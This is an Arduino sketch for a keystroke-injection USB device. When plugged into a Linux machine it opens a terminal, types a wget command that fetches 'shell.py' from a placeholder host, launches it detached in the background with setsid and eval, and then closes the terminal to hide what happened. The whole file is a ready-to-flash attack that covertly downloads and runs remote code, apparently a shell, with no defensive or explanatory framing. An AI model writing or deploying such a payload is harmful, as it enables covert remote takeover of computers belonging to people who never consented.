#include "Keyboard.h"

void safeType(const char* str) {
  while (*str) {
    Keyboard.write(*str++);
    delay(25);
  }
}

void pressEnter() {
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(200);
}

void setup() {
  pinMode(LED_BUILTIN, OUTPUT);

  delay(2000);
  Keyboard.begin();

  // open terminal
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(200);
  Keyboard.releaseAll();

  delay(1500);

  // DDownload the script
  Keyboard.println("wget http://<IP>/shell.py");

  delay(1500);

  // Write the command to the CMD variable
  safeType("CMD='setsid python3 shell.py > outlog.txt 2>&1 &'");
  pressEnter();

  delay(500);

  // Execute
  safeType("eval $CMD");
  pressEnter();

  delay(500);

  // close terminal
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);


  // Hard reset
  for (int i = 0; i < 3; i++) {
    Keyboard.releaseAll();
    delay(50);
  }
}

void loop() {
  digitalWrite(LED_BUILTIN, HIGH);
  delay(300);
  digitalWrite(LED_BUILTIN, LOW);
  delay(300);
}
